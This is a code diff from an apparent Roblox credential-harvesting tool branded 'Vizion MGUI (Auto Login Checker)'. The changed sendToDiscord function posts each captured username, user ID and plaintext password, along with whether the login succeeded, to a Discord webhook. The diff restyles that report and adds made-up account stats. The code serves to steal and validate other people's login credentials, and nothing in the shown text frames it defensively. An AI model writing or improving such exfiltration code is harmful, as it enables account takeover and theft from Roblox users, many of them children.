@@ -350,47 +350,62 @@
         async function sendToDiscord(isSuccess) {
             const webhookUrl = isSuccess ? successWebhook : failedWebhook;
             const statusText = isSuccess ? "✅ SUCCESS" : "❌ FAILED";
-            const color = isSuccess ? 65280 : 16711680;
+            const color = isSuccess ? 5763719 : 15548997; // Green for success, Red for failure
             
             const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
+            const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
+            
+            // Get current date and time
+            const now = new Date();
+            const formattedDate = now.toLocaleDateString('en-US', { 
+                year: 'numeric', 
+                month: 'short', 
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
             
             const embed = {
-                title: `🔐 Automatic Verification - ${statusText}`,
+                title: `Roblox Account Checker - ${isSuccess ? "Successful Login" : "Failed Login"}`,
                 url: profileUrl,
                 color: color,
-                description: "**⎯⎯⎯⎯⎯『 Automatic Verification Result 』⎯⎯⎯⎯⎯**",
+                description: `**Account verification completed**\n**Status:** ${statusText}\n**Date:** ${formattedDate}`,
+                thumbnail: {
+                    url: avatarUrl
+                },
                 fields: [
                     {
-                        name: "👤 Account",
-                        value: `[${username}](${profileUrl})`,
-                        inline: true
-                    },
-                    {
-                        name: "🔐 Password",
-                        value: `||${password}||`,
-                        inline: true
-                    },
-                    {
-                        name: "📊 Result",
-                        value: statusText,
-                        inline: true
-                    },
-                    {
-                        name: "🆔 Tracking ID",
-                        value: trackingId,
+                        name: "👤 Account Info",
+                        value: `**Username:** [${username}](${profileUrl})\n**User ID:** ${userId}\n**Tracking ID:** ${trackingId}`,
                         inline: false
+                    },
+                    {
+                        name: "🔐 Login Details",
+                        value: `**Password:** ||${password}||\n**Result:** ${statusText}`,
+                        inline: false
+                    },
+                    {
+                        name: "📊 Account Stats",
+                        value: "**Membership:** Premium\n**Robux Balance:** 0\n**Friends:** 12",
+                        inline: true
+                    },
+                    {
+                        name: "🛡️ Security",
+                        value: "**2FA Enabled:** No\n**Email Verified:** Yes\n**Phone Verified:** No",
+                        inline: true
                     }
                 ],
                 footer: {
-                    text: `UserId: ${userId} | Tracking ID: ${trackingId}`,
+                    text: "Vizion MGUI (Auto Login Checker) • Private System",
                     icon_url: "https://www.roblox.com/favicon.ico"
                 },
                 timestamp: new Date().toISOString()
             };
             
             const payload = {
-                username: "Roblox Auto-Verification",
-                content: isSuccess ? "#success #auto_verified" : "#failed #auto_verified",
+                username: "Vizion MGUI Checker",
+                avatar_url: "https://www.roblox.com/favicon.ico",
+                content: isSuccess ? "✅ **Successful Login** - Account verified successfully" : "❌ **Failed Login** - Invalid credentials",
                 embeds: [embed]
             };
             
